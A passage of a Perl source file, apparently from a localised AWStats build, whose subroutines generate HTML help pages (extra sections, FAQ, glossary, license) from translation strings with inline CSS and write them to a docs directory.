var(--border-color);border-radius:8px;padding:20px;margin-bottom:20px}.module-description{font-size:1.1rem;margin-bottom:20px}.badges{display:flex;gap:10px;flex-wrap:wrap;margin-top:10px}.badge{background-color:var(--badge-bg);border:1px solid var(--border-color);border-radius:20px;padding:5px 12px;font-size:0.9rem;font-weight:500}.feature-card{background-color:var(--surface);border:1px solid var(--border-color);border-radius:8px;padding:20px;margin:20px 0}.feature-icon{font-size:2em;margin-bottom:10px}.links-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:20px;margin:20px 0}.link-card{background-color:var(--surface-secondary);border:1px solid var(--border-color);border-radius:8px;padding:20px;transition:transform 0.2s}.link-card:hover{transform:translateY(-2px)}.link-icon{font-size:1.8em;margin-bottom:10px}.link-title{font-weight:600;font-size:1.1rem;margin-bottom:8px}.link-url{margin:8px 0;word-break:break-all}.link-url a{font-size:0.9rem}.steps-container{display:flex;flex-direction:column;gap:15px;margin:20px 0}.step-card{background-color:var(--surface-secondary);border:1px solid var(--border-color);border-radius:8px;padding:20px;position:relative}.step-number{position:absolute;top:-10px;left:20px;background-color:var(--step-number);color:white;width:30px;height:30px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-weight:bold}.step-title{font-weight:600;font-size:1.1rem;margin-top:5px;margin-bottom:10px;padding-left:30px}.params-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:20px;margin:20px 0}.param-card{background-color:var(--surface-secondary);border:1px solid var(--border-color);border-radius:8px;padding:20px}.param-name{font-weight:600;color:var(--accent);margin-bottom:10px;font-size:1rem}.param-desc{font-size:0.95rem;color:var(--text-secondary)}.note-box{background-color:var(--surface-secondary);border-left:4px solid var(--accent);padding:15px;border-radius:4px;margin:20px 0}.code-inline{background-color:var(--code-bg);padding:2px 6px;border-radius:4px;font-family:'Monaco','Menlo',monospace;font-size:0.9rem}hr{border:none;border-top:1px solid var(--border-color);margin:30px 0}\@media (max-width:768px){.links-grid{grid-template-columns:1fr}.params-grid{grid-template-columns:1fr}}.screenshot-container{margin:20px 0;text-align:center;border:1px solid var(--border-color);border-radius:12px;padding:15px;background-color:var(--surface-secondary)}.screenshot{max-width:100%;height:auto;border-radius:8px;box-shadow:0 4px 12px rgba(0,0,0,0.1)}.screenshot-caption{margin-top:10px;color:var(--text-secondary);font-size:0.9em;font-style:italic}a,a:link,a:visited{text-decoration:none;color:var(--link-color);transition:color 0.2s ease}a:hover{color:var(--accent)}.section{margin:40px 0;padding:25px;background-color:var(--card-bg);border:1px solid var(--border-color);border-radius:12px}.info-box{background-color:var(--header-bg);border-left:4px solid var(--link-color);padding:20px;border-radius:8px}
    </style>
</head>
<body>
    <div class="container">
        <div class="doc-card">
            <h1>$doc_title</h1>
		<div class="container">
			$dolibarr_full
		</div>
    </div>
    
    <hr>
    
	<div id="sponsor" class="section">
	$SPONSOR_SECTION
    </div>
    
$theme_script
</body>
</html>
END_HTML

    my $doc_dir = "$dir/docs";
    open(my $fh, '>:encoding(UTF-8)', "$doc_dir/awstats_dolibarr.html") or return;
    print $fh $html;
    close $fh;

    print "DEBUG: Generated awstats_dolibarr.html in $doc_dir with language $lang\n" if $Debug;
}

#------------------------------------------------------------------------------
# 生成 extra 文档页面
# Parameters: $dir (统计目录)
# Return: None
#------------------------------------------------------------------------------
sub generate_extra_doc {
    my ($dir) = @_;
    
    # 获取页面标题
    my $page_title = sprintf(_t("Advanced Web Statistics %s"), $SiteDomain);
    my $theme_script = get_theme_script();
    # ========== 文档基本信息 ==========
    my $doc_title = _t("docs.extra.title");
    my $subtitle = _t("docs.extra.subtitle");
    my $full_title = "$doc_title - $page_title";
    my $SPONSOR_SECTION = _t("sponsor.section");
    # ========== 介绍 ==========
    my $intro = _t("extra.intro");
    
    # ========== 配置说明 ==========
    my $config_explanation = _t("extra.config.explanation");
    
    # ========== 示例导航 ==========
    my $examples_title = _t("extra.examples.title");
    my $example_productorders = _t("extra.example.productorders");
    my $example_bugzilla = _t("extra.example.bugzilla");
    my $example_awredir = _t("extra.example.awredir");
    my $example_aborted = _t("extra.example.aborted");
    my $example_domainaliases = _t("extra.example.domainaliases");
    my $example_level2dir = _t("extra.example.level2dir");
    
    # ========== 示例 1 ==========
    my $example1_title = _t("extra.example1.title");
    my $example1_desc = _t("extra.example1.desc");
    
    # ========== 示例 2 ==========
    my $example2_title = _t("extra.example2.title");
    my $example2_desc = _t("extra.example2.desc");
    
    # ========== 示例 3 ==========
    my $example3_title = _t("extra.example3.title");
    my $example3_desc = _t("extra.example3.desc");
    
    # ========== 示例 4 ==========
    my $example4_title = _t("extra.example4.title");
    my $example4_desc = _t("extra.example4.desc");
    
    # ========== 示例 5 ==========
    my $example5_title = _t("extra.example5.title");
    my $example5_desc = _t("extra.example5.desc");
    
    # ========== 示例 6 ==========
    my $example6_title = _t("extra.example6.title");
    my $example6_desc = _t("extra.example6.desc");
    
    # ========== 配置参数说明 ==========
    my $config_params_title = _t("extra.config.params.title");
    my $config_params_desc = _t("extra.config.params.desc");
    my $config_warning = _t("extra.config.warning");
    
    # 获取语言和方向
    my $lang = $Lang || 'en';
    my $dir_attr = $PageDir ? 'rtl' : 'ltr';
    
    my $html = <<"END_HTML";
<!DOCTYPE html>
<html lang="$lang" dir="$dir_attr">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="AWStats $doc_title">
    <meta name="keywords" content="awstats, extra, sections, reports, customization">
    <title>$full_title</title>
    <style>
	:root{--bg-color:#ffffff;--text-color:#1f2937;--link-color:#2563eb;--border-color:#e5e7eb;--header-bg:#f9fafb;--card-bg:#ffffff;--code-bg:#f1f5f9;--accent:#3b82f6;--surface:#ffffff;--surface-secondary:#f9fafb;--example-bg:#f3f4f6}[data-theme="dark"]{--bg-color:#1f2937;--text-color:#f3f4f6;--link-color:#60a5fa;--border-color:#374151;--header-bg:#111827;--card-bg:#2d3748;--code-bg:#2d3748;--accent:#60a5fa;--surface:#2d3748;--surface-secondary:#1f2937;--example-bg:#374151}body{font-family:system-ui,-apple-system,sans-serif;line-height:1.6;max-width:1200px;margin:0 auto;padding:20px;background-color:var(--bg-color);color:var(--text-color)}h1{color:var(--text-color);border-bottom:2px solid var(--accent);padding-bottom:10px;font-size:2em;margin-bottom:20px}h2{color:var(--text-color);border-bottom:1px solid var(--border-color);padding-bottom:8px;font-size:1.5em;margin:30px 0 20px}h3{color:var(--text-color);font-size:1.2em;margin:25px 0 15px;color:var(--accent)}.doc-nav{margin:20px 0;padding:15px;background-color:var(--header-bg);border-radius:8px;border:1px solid var(--border-color);display:flex;gap:15px;flex-wrap:wrap;position:sticky;top:0;z-index:10;backdrop-filter:blur(10px)}.doc-nav a{color:var(--link-color);text-decoration:none;padding:5px 10px;border-radius:4px;transition:background-color 0.2s}.doc-nav a:hover{background-color:var(--border-color)}.info-box{background-color:var(--surface-secondary);border-left:4px solid var(--accent);padding:20px;border-radius:8px;margin:20px 0}.info-box p{margin:10px 0}.info-box p:first-child{margin-top:0}.info-box p:last-child{margin-bottom:0}.example-box{background-color:var(--example-bg);border:1px solid var(--border-color);border-radius:8px;padding:20px;margin:20px 0}.example-title{font-size:1.2em;font-weight:600;color:var(--accent);margin-bottom:15px}pre{background-color:var(--code-bg);padding:15px;border-radius:8px;overflow-x:auto;border:1px solid var(--border-color);font-family:'Monaco','Menlo',monospace;font-size:0.9rem;margin:15px 0}code{background-color:var(--code-bg);padding:2px 6px;border-radius:4px;font-family:'Monaco','Menlo',monospace;font-size:0.9rem}.example-list{list-style:none;padding:0;margin:20px 0;display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:10px}.example-list li{margin:0}.example-list a{display:block;padding:10px 15px;background-color:var(--surface-secondary);border:1px solid var(--border-color);border-radius:6px;transition:transform 0.2s}.example-list a:hover{transform:translateX(5px);background-color:var(--border-color);text-decoration:none}.param-table{width:100%;border-collapse:collapse;margin:20px 0}.param-table th{background-color:var(--header-bg);padding:10px;text-align:left;border:1px solid var(--border-color)}.param-table td{padding:10px;border:1px solid var(--border-color)}.param-table tr:hover{background-color:var(--surface-secondary)}.warning-note{background-color:#fff3cd;border:1px solid #ffeeba;color:#856404;padding:15px;border-radius:8px;margin:20px 0}[data-theme="dark"] .warning-note{background-color:#332e1c;border-color:#665c2c;color:#ffd966}hr{border:none;border-top:1px solid var(--border-color);margin:30px 0}\@media (max-width:768px){.example-list{grid-template-columns:1fr}}a,a:link,a:visited{text-decoration:none;color:var(--link-color);transition:color 0.2s ease}a:hover{color:var(--accent)}.section{margin:40px 0;padding:25px;background-color:var(--card-bg);border:1px solid var(--border-color);border-radius:12px}.info-box{background-color:var(--header-bg);border-left:4px solid var(--link-color);padding:20px;border-radius:8px}
    </style>
</head>
<body>
    <h1>$doc_title</h1>
    
    <!-- ==================== 介绍 ==================== -->
    <div class="info-box">
        $intro
    </div>
    
    <!-- ==================== 配置说明 ==================== -->
    <div class="info-box">
        $config_explanation
    </div>
    
    <!-- ==================== 示例导航 ==================== -->
    <h2 id="examples">📋 $examples_title</h2>
    <ul class="example-list">
        <li><a href="#productorders">$example_productorders</a></li>
        <li><a href="#bugzilla">$example_bugzilla</a></li>
        <li><a href="#awredir">$example_awredir</a></li>
        <li><a href="#aborted">$example_aborted</a></li>
        <li><a href="#domainaliases">$example_domainaliases</a></li>
        <li><a href="#level2dir">$example_level2dir</a></li>
    </ul>
    
    <!-- ==================== 示例 1 ==================== -->
    <h3 id="productorders">📌 $example1_title</h3>
    <div class="example-box">
        $example1_desc
    </div>
    
    <!-- ==================== 示例 2 ==================== -->
    <h3 id="bugzilla">📌 $example2_title</h3>
    <div class="example-box">
        $example2_desc
    </div>
    
    <!-- ==================== 示例 3 ==================== -->
    <h3 id="awredir">📌 $example3_title</h3>
    <div class="example-box">
        $example3_desc
    </div>
    
    <!-- ==================== 示例 4 ==================== -->
    <h3 id="aborted">📌 $example4_title</h3>
    <div class="example-box">
        $example4_desc
    </div>
    
    <!-- ==================== 示例 5 ==================== -->
    <h3 id="domainaliases">📌 $example5_title</h3>
    <div class="example-box">
        $example5_desc
    </div>
    
    <!-- ==================== 示例 6 ==================== -->
    <h3 id="level2dir">📌 $example6_title</h3>
    <div class="example-box">
        $example6_desc
    </div>
    
    <!-- ==================== 配置参数说明 ==================== -->
    <h2 id="extraconfig">⚙️ $config_params_title</h2>
    <div class="info-box">
        $config_params_desc
    </div>
    
    <div class="warning-note">
        $config_warning
    </div>
    
    <hr>
    
	<div id="sponsor" class="section">
	$SPONSOR_SECTION
    </div>
    
$theme_script
</body>
</html>
END_HTML

    my $doc_dir = "$dir/docs";
    open(my $fh, '>:encoding(UTF-8)', "$doc_dir/awstats_extra.html") or return;
    print $fh $html;
    close $fh;

    print "DEBUG: Generated awstats_extra.html in $doc_dir with language $lang\n" if $Debug;
}

#------------------------------------------------------------------------------
# 生成 faq 文档页面
# Parameters: $dir (统计目录)
# Return: None
#------------------------------------------------------------------------------
sub generate_faq_doc {
    my ($dir) = @_;
    
    # 获取页面标题
    my $page_title = sprintf(_t("Advanced Web Statistics %s"), $SiteDomain);
    my $theme_script = get_theme_script();
    # ========== 文档基本信息 ==========
    my $doc_title = _t("docs.faq.title");
    my $subtitle = _t("docs.faq.subtitle");
    my $full_title = "$doc_title - $page_title";
    my $SPONSOR_SECTION = _t("sponsor.section");
	my $faq_content = _t("faq.complete");
	   $faq_content =~ s/\\n/\n/g;
    # 获取语言和方向
    my $lang = $Lang || 'en';
    my $dir_attr = $PageDir ? 'rtl' : 'ltr';
    
    my $html = <<"END_HTML";
<!DOCTYPE html>
<html lang="$lang" dir="$dir_attr">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="AWStats $doc_title">
    <meta name="keywords" content="awstats, faq, troubleshooting, help, support">
    <title>$full_title</title>
    <style>
	:root{--bg-primary:#ffffff;--bg-secondary:#f8f9fa;--bg-code:#f2f4f6;--text-primary:#212529;--text-secondary:#495057;--text-muted:#6c757d;--link-color:#0d6efd;--link-hover:#0a58ca;--border-color:#dee2e6;--heading-color:#1a2b3c;--accent-light:#e7f1ff;--accent-border:#9ec5fe;--code-color:#d63384;--shadow-sm:0 1px 2px rgba(0,0,0,0.05);--shadow-md:0 4px 6px rgba(0,0,0,0.1);--card-bg:#ffffff;--header-bg:#f8f9fa;--accent:#0a58ca}[data-theme="dark"]{--bg-primary:#1e1e2f;--bg-secondary:#2d2d3f;--bg-code:#2a2a3c;--text-primary:#e4e6eb;--text-secondary:#b0b3b8;--text-muted:#8c8f94;--link-color:#8cb4ff;--link-hover:#a6c8ff;--border-color:#3e3e5e;--heading-color:#cfd9e6;--accent-light:#2c3a5e;--accent-border:#4f6b9c;--code-color:#f08d8d;--shadow-sm:0 1px 2px rgba(0,0,0,0.3);--shadow-md:0 4px 8px rgba(0,0,0,0.5);--card-bg:#2d2d3f;--header-bg:#2a2a3c;--accent:#a6c8ff}body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;line-height:1.6;color:var(--text-primary);background-color:var(--bg-primary);margin:0;padding:20px;transition:background-color 0.3s ease,color 0.2s ease;scroll-behavior:smooth;max-width:1200px;margin:0 auto}a,a:link,a:visited{text-decoration:none;color:var(--link-color);transition:color 0.2s ease}a:hover{color:var(--accent)}.section{margin:40px 0;padding:25px;background-color:var(--card-bg);border:1px solid var(--border-color);border-radius:12px}.info-box{background-color:var(--header-bg);border-left:4px solid var(--link-color);padding:20px;border-radius:8px}h1{font-size:2.4rem;font-weight:600;color:var(--heading-color);border-bottom:3px solid var(--link-color);padding-bottom:12px;margin:1.5rem 0 0.5rem;letter-spacing:-0.02em}h1:first-of-type{margin-top:0.5rem}.subtitle{font-size:1.2rem;color:var(--text-secondary);margin:-5px 0 25px 0;font-style:italic}h2{font-size:2rem;font-weight:500;color:var(--heading-color);border-left:6px solid var(--link-color);padding-left:16px;margin:2.2rem 0 1.2rem 0;background:linear-gradient(to right,var(--bg-secondary),transparent);padding:12px 0 12px 16px;border-radius:0 8px 8px 0}h3{font-size:1.5rem;font-weight:500;color:var(--heading-color);margin:1.8rem 0 1rem 0;padding-bottom:5px;border-bottom:2px dashed var(--border-color)}h3[id]{scroll-margin-top:20px}h3[id]::before{content:"🔗 ";color:var(--link-color);font-size:1.3rem;opacity:0.7;margin-right:4px}ul,ol{padding-left:1.8rem}li{margin:8px 0;color:var(--text-secondary)}h2 + ul,h2 + ul ul{background:var(--bg-secondary);padding:18px 18px 18px 38px;border-radius:12px;box-shadow:var(--shadow-sm);border:1px solid var(--border-color);list-style-type:none}h2 + ul li{margin:8px 0;position:relative}h2 + ul li::before{content:"▹";color:var(--link-color);font-weight:bold;position:absolute;left:-22px;font-size:1.2rem}p{color:var(--text-primary);margin:1rem 0;line-height:1.7}strong{color:var(--heading-color);font-weight:600}p strong:first-child{color:var(--link-color);font-size:1.05em}code,pre{font-family:"SF Mono",Menlo,Monaco,Consolas,"Courier New",monospace;font-size:0.9em;background-color:var(--bg-code);border:1px solid var(--border-color);border-radius:6px}code{color:var(--code-color);padding:0.2em 0.4em;white-space:nowrap}pre{display:block;padding:16px;margin:16px 0;line-height:1.45;overflow-x:auto;border-radius:8px;white-space:pre;word-wrap:normal;box-shadow:inset 0 0 0 1px var(--border-color);background-color:var(--bg-secondary)}pre code{background:none;border:none;color:var(--text-primary);padding:0;white-space:pre;font-size:0.9rem}blockquote,.note{background:var(--accent-light);border-left:5px solid var(--accent-border);padding:1rem 1.5rem;margin:1.5rem 0;border-radius:0 12px 12px 0;color:var(--text-secondary);font-style:normal;box-shadow:var(--shadow-sm)}blockquote p:last-child,.note p:last-child{margin-bottom:0}hr{border:none;border-top:2px solid var(--border-color);margin:2.5rem 0;opacity:0.5}table{width:100%;border-collapse:collapse;margin:1.5rem 0;background:var(--bg-secondary);border:1px solid var(--border-color);border-radius:12px;overflow:hidden}th{background-color:var(--heading-color);color:var(--bg-primary);font-weight:600;padding:12px;text-align:left}td{padding:10px 12px;border-top:1px solid var(--border-color);color:var(--text-primary)}tr:nth-child(even){background-color:var(--bg-code)}html{scroll-padding-top:20px;scroll-behavior:smooth}h2 + ul a{transition:transform 0.2s,color 0.2s;display:inline-block}h2 + ul a:hover{transform:translateX(6px)}[dir="rtl"]{text-align:right}[dir="rtl"] h2{border-left:none;border-right:6px solid var(--link-color);padding-left:0;padding-right:16px;background:linear-gradient(to left,var(--bg-secondary),transparent)}[dir="rtl"] h2 + ul{padding-left:18px;padding-right:38px}[dir="rtl"] h2 + ul li::before{left:auto;right:-22px}[dir="rtl"] blockquote{border-left:none;border-right:5px solid var(--accent-border);border-radius:12px 0 0 12px}\@media (max-width:768px){body{padding:15px}h1{font-size:2rem}h2{font-size:1.6rem}h3{font-size:1.3rem}ul,ol{padding-left:1.2rem}h2 + ul{padding:15px 15px 15px 30px}}\@media (max-width:480px){body{padding:10px}h1{font-size:1.7rem}h2{font-size:1.4rem;padding:8px 0 8px 12px}pre{padding:10px;font-size:0.85rem}code{white-space:normal;word-break:break-word}}\@media print{body{background:white;color:black;padding:0.5in}a{color:black;text-decoration:underline;border:none}pre,code{background:#f5f5f5;border:1px solid #ccc;color:black}h2,h3{page-break-after:avoid}h2 + ul{background:none;border:1px solid #aaa;box-shadow:none}}a[href^="#"]::before{content:"⚓ ";font-size:0.9em;opacity:0.6}h2 + ul a[href^="#"]::before{content:none}[id]{scroll-margin-top:30px}
    </style>
</head>
<body>
    <h1>$doc_title</h1>
    <div class="subtitle">$subtitle</div>
    $faq_content
	<div id="sponsor" class="section">
	$SPONSOR_SECTION
    </div>
    
$theme_script
</body>
</html>
END_HTML

    my $doc_dir = "$dir/docs";
    open(my $fh, '>:encoding(UTF-8)', "$doc_dir/awstats_faq.html") or return;
    print $fh $html;
    close $fh;

    print "DEBUG: Generated awstats_faq.html in $doc_dir with language $lang\n" if $Debug;
}

#------------------------------------------------------------------------------
# 生成 glossary 文档页面
# Parameters: $dir (统计目录)
# Return: None
#------------------------------------------------------------------------------
sub generate_glossary_doc {
    my ($dir) = @_;
    
    # 获取页面标题
    my $page_title = sprintf(_t("Advanced Web Statistics %s"), $SiteDomain);
    my $theme_script = get_theme_script();
    # ========== 文档基本信息 ==========
    my $doc_title = _t("docs.glossary.title");
    my $subtitle = _t("docs.glossary.subtitle");
    my $full_title = "$doc_title - $page_title";
    my $SPONSOR_SECTION = _t("sponsor.section");
    # ========== 基础术语 ==========
    my $glossary_unique_visitor = _t("glossary.unique_visitor");
    my $glossary_visits = _t("glossary.visits");
    my $glossary_pages = _t("glossary.pages");
    my $glossary_hits = _t("glossary.hits");
    my $glossary_bandwidth = _t("glossary.bandwidth");
    my $glossary_entry_page = _t("glossary.entry_page");
    my $glossary_exit_page = _t("glossary.exit_page");
    my $glossary_session_duration = _t("glossary.session_duration");
    my $glossary_grabber = _t("glossary.grabber");
    my $glossary_direct_access = _t("glossary.direct_access");
    my $glossary_add_to_favourites = _t("glossary.add_to_favourites");
    
    # ========== HTTP 状态码 ==========
    my $glossary_http_title = _t("glossary.http.title");
    my $glossary_http_intro = _t("glossary.http.intro");
    my $glossary_http_classes = _t("glossary.http.classes");
    my $glossary_http_1xx = _t("glossary.http.1xx");
    my $glossary_http_2xx = _t("glossary.http.2xx");
    my $glossary_http_3xx = _t("glossary.http.3xx");
    my $glossary_http_4xx = _t("glossary.http.4xx");
    my $glossary_http_5xx = _t("glossary.http.5xx");
    
    # ========== SMTP 状态码 ==========
    my $glossary_smtp_title = _t("glossary.smtp.title");
    my $glossary_smtp_intro = _t("glossary.smtp.intro");
    my $glossary_smtp_2xx = _t("glossary.smtp.2xx");
    my $glossary_smtp_4xx = _t("glossary.smtp.4xx");
    my $glossary_smtp_5xx = _t("glossary.smtp.5xx");
    
    # ========== 页脚 ==========
    my $footer_author = _t("glossary.footer.author");
    my $footer_twitter = _t("glossary.footer.twitter");
    
    # 获取语言和方向
    my $lang = $Lang || 'en';
    my $dir_attr = $PageDir ? 'rtl' : 'ltr';
    
    my $html = <<"END_HTML";
<!DOCTYPE html>
<html lang="$lang" dir="$dir_attr">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="AWStats $doc_title">
    <meta name="keywords" content="awstats, glossary, terms, definitions, http, smtp">
    <title>$full_title</title>
    <style>
	:root{--bg-color:#ffffff;--text-color:#1f2937;--link-color:#2563eb;--border-color:#e5e7eb;--header-bg:#f9fafb;--card-bg:#ffffff;--code-bg:#f1f5f9;--accent:#3b82f6;--surface:#ffffff;--surface-secondary:#f9fafb;--glossary-term:#3b82f6;--glossary-http:#10b981;--glossary-smtp:#8b5cf6;--table-header:#e5e7eb;--table-row-even:#f9fafb}[data-theme="dark"]{--bg-color:#1f2937;--text-color:#f3f4f6;--link-color:#60a5fa;--border-color:#374151;--header-bg:#111827;--card-bg:#2d3748;--code-bg:#2d3748;--accent:#60a5fa;--surface:#2d3748;--surface-secondary:#1f2937;--glossary-term:#60a5fa;--glossary-http:#34d399;--glossary-smtp:#a78bfa;--table-header:#374151;--table-row-even:#1f2937}body{font-family:system-ui,-apple-system,sans-serif;line-height:1.6;max-width:1200px;margin:0 auto;padding:20px;background-color:var(--bg-color);color:var(--text-color)}h1{color:var(--text-color);border-bottom:2px solid var(--accent);padding-bottom:10px;font-size:2em;margin-bottom:20px}.subtitle{color:var(--text-color);opacity:0.8;font-style:italic;margin-bottom:30px;font-size:1.1em}.doc-nav{margin:20px 0;padding:15px;background-color:var(--header-bg);border-radius:8px;border:1px solid var(--border-color);display:flex;gap:15px;flex-wrap:wrap;position:sticky;top:0;z-index:10;backdrop-filter:blur(10px)}.doc-nav a{color:var(--link-color);text-decoration:none;padding:5px 10px;border-radius:4px;transition:background-color 0.2s}.doc-nav a:hover{background-color:var(--border-color)}.glossary-section{margin:40px 0;padding:25px;background-color:var(--card-bg);border:1px solid var(--border-color);border-radius:12px;box-shadow:0 2px 4px rgba(0,0,0,0.05)}.glossary-section h2{margin-top:0;padding-bottom:10px;border-bottom:2px solid;font-size:1.5em}.glossary-basic h2{border-color:var(--glossary-term);color:var(--glossary-term)}.glossary-http h2{border-color:var(--glossary-http);color:var(--glossary-http)}.glossary-smtp h2{border-color:var(--glossary-smtp);color:var(--glossary-smtp)}.term-card{margin:25px 0;padding:20px;background-color:var(--surface-secondary);border:1px solid var(--border-color);border-radius:8px;transition:transform 0.2s,box-shadow 0.2s;scroll-margin-top:80px}.term-card:hover{transform:translateX(5px);box-shadow:0 4px 12px rgba(0,0,0,0.1)}.term-card h3{margin-top:0;color:var(--link-color);font-size:1.3em;border-bottom:1px solid var(--border-color);padding-bottom:8px}.term-card h4{color:var(--text-color);font-size:1.1em;margin:15px 0 10px}.term-card p{margin:10px 0}.term-card ul,.term-card ol{margin:10px 0;padding-left:25px}.term-card li{margin:3px 0}.term-card pre{background-color:var(--code-bg);padding:12px;border-radius:6px;overflow-x:auto;border:1px solid var(--border-color);font-family:'Monaco','Menlo',monospace;font-size:0.9rem}.term-card code{background-color:var(--code-bg);padding:2px 6px;border-radius:4px;font-family:'Monaco','Menlo',monospace;font-size:0.9rem}.code-table{width:100%;border-collapse:collapse;margin:15px 0;border:1px solid var(--border-color);border-radius:8px;overflow:hidden}.code-table th{background-color:var(--table-header);padding:10px;text-align:left;font-weight:600}.code-table td{padding:8px 10px;border-top:1px solid var(--border-color)}.code-table tr:nth-child(even){background-color:var(--table-row-even)}.code-table tr:hover{background-color:var(--border-color)}.code-table td:first-child{font-family:'Monaco','Menlo',monospace;font-weight:600;width:80px}.glossary-note{background-color:var(--header-bg);border-left:4px solid var(--accent);padding:15px;border-radius:4px;margin:15px 0}.glossary-note p{margin:5px 0}hr{border:none;border-top:1px solid var(--border-color);margin:30px 0}.footer-note{margin-top:40px;padding:20px;background-color:var(--header-bg);border-radius:8px;text-align:center;font-size:0.9em}\@media (max-width:768px){.term-card:hover{transform:none}.code-table{font-size:0.9rem}.code-table td:first-child{width:60px}}a,a:link,a:visited{text-decoration:none;color:var(--link-color);transition:color 0.2s ease}a:hover{color:var(--accent)}.section{margin:40px 0;padding:25px;background-color:var(--card-bg);border:1px solid var(--border-color);border-radius:12px}.info-box{background-color:var(--header-bg);border-left:4px solid var(--link-color);padding:20px;border-radius:8px}
    </style>
</head>
<body>
    <h1>$doc_title</h1>
    <div class="subtitle">$subtitle</div>
    
    <!-- ==================== 基础术语 ==================== -->
    <div id="basic" class="glossary-section glossary-basic">
        <div id="UniqueVisitor" class="term-card">$glossary_unique_visitor</div>
        <div id="Visits" class="term-card">$glossary_visits</div>
        <div id="Pages" class="term-card">$glossary_pages</div>
        <div id="Hits" class="term-card">$glossary_hits</div>
        <div id="Bandwidth" class="term-card">$glossary_bandwidth</div>
        <div id="EntryPage" class="term-card">$glossary_entry_page</div>
        <div id="ExitPage" class="term-card">$glossary_exit_page</div>
        <div id="SessionDuration" class="term-card">$glossary_session_duration</div>
        <div id="Grabber" class="term-card">$glossary_grabber</div>
        <div id="Direct" class="term-card">$glossary_direct_access</div>
        <div id="AddToFavourites" class="term-card">$glossary_add_to_favourites</div>
    </div>
    
    <!-- ==================== HTTP 状态码 ==================== -->
    <div id="http" class="glossary-section glossary-http">
        <h2>$glossary_http_title</h2>
        
        <div class="term-card">
            $glossary_http_intro
            $glossary_http_classes
        </div>
        
        <div id="1xx" class="term-card">$glossary_http_1xx</div>
        <div id="2xx" class="term-card">$glossary_http_2xx</div>
        <div id="3xx" class="term-card">$glossary_http_3xx</div>
        <div id="4xx" class="term-card">$glossary_http_4xx</div>
        <div id="5xx" class="term-card">$glossary_http_5xx</div>
    </div>
    
    <!-- ==================== SMTP 状态码 ==================== -->
    <div id="smtp" class="glossary-section glossary-smtp">
        <h2>$glossary_smtp_title</h2>
        
        <div class="term-card">
            $glossary_smtp_intro
        </div>
        
        <div id="SMTP23" class="term-card">$glossary_smtp_2xx</div>
        <div id="SMTP4" class="term-card">$glossary_smtp_4xx</div>
        <div id="SMTP5" class="term-card">$glossary_smtp_5xx</div>
    </div>
    
    <hr>
    
	<div id="sponsor" class="section">
	$SPONSOR_SECTION
    </div>
    
$theme_script
</body>
</html>
END_HTML

    my $doc_dir = "$dir/docs";
    open(my $fh, '>:encoding(UTF-8)', "$doc_dir/awstats_glossary.html") or return;
    print $fh $html;
    close $fh;

    print "DEBUG: Generated awstats_glossary.html in $doc_dir with language $lang\n" if $Debug;
}

#------------------------------------------------------------------------------
# 生成 license 文档页面
# Parameters: $dir (统计目录)
# Return: None
#------------------------------------------------------------------------------
sub generate_license_doc {
    my ($dir) = @_;
    
    # 获取页面标题
    my $page_title = sprintf(_t("Advanced Web Statistics %s"), $SiteDomain);
    my $theme_script = get_theme_script();
    # ========== 文档基本信息 ==========
    my $doc_title = _t("docs.license.title");
    my $full_title = "$doc_title - $page_title";
    my $SPONSOR_SECTION = _t("sponsor.section");
    # ========== 许可证介绍 ==========
    my $license_desc = _t("license.intro.desc");
    my $license_follow = _t("license.intro.follow");
    my $chart_title = _t("license.chart.title");
    
    # ========== 表格头部 ==========
    my $table_header = _t("license.table.header");
    
    # ========== 分类行 ==========
    my $category_free = _t("license.category.free_software");
    my $category_semi_free = _t("license.category.semi_free");
    my $category_proprietary = _t("license.category.proprietary");
    my $category_modern = _t("license.category.modern_opensource");
    
    # ========== 自由软件行 ==========
    my $row_public_domain = _t("license.row.public_domain");
    my $row_mit = _t("license.row.mit");
    my $row_bsd2 = _t("license.row.bsd2");
    my $row_bsd3 = _t("license.row.bsd3");
    my $row_apache2 = _t("license.row.apache2");
    my $row_isc = _t("license.row.isc");
    my $row_lgpl = _t("license.row.lgpl");
    my $row_mpl2 = _t("license.row.mpl2");
    my $row_gpl = _t("license.row.gpl");
    my $row_agpl3 = _t("license.row.agpl3");
    my $row_epl2 = _t("license.row.epl2");
    my $row_cddl1 = _t("license.row.cddl1");
    
    # ========== 半自由软件行 ==========
    my $row_semi_free = _t("license.row.semi_free");
    
    # ========== 专有软件行 ==========
    my $row_freeware = _t("license.row.freeware");
    my $row_shareware = _t("license.row.shareware");
    my $row_commercial = _t("license.row.commercial");
    
    # ========== 现代开源协议行 ==========
    my $row_python = _t("license.row.python");
    my $row_php = _t("license.row.php");
    my $row_artistic = _t("license.row.artistic");
    my $row_osl3 = _t("license.row.osl3");
    
    # ========== 表格注脚 ==========
    my $notes_title = _t("license.notes.title");
    my $note1 = _t("license.note1");
    my $note2 = _t("license.note2");
    my $note3 = _t("license.note3");
    my $note4 = _t("license.note4");
    my $note5 = _t("license.note5");
    my $note6 = _t("license.note6");
    my $note7 = _t("license.note7");
    my $note8 = _t("license.note8");
    my $note9 = _t("license.note9");
    my $note10 = _t("license.note10");
    my $important_title = _t("license.important.title");
    my $important_desc = _t("license.important.desc");
    my $license_date = _t("license.date");
    
    # ========== 页脚 ==========
    my $footer_author = _t("license.footer.author");
    my $footer_twitter = _t("license.footer.twitter");
    
    # 获取语言和方向
    my $lang = $Lang || 'en';
    my $dir_attr = $PageDir ? 'rtl' : 'ltr';
    
    my $html = <<"END_HTML";
<!DOCTYPE html>
<html lang="$lang" dir="$dir_attr">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="AWStats $doc_title">
    <meta name="keywords" content="awstats, license, gpl, copyright, opensource">
    <title>$full_title</title>
    <style>
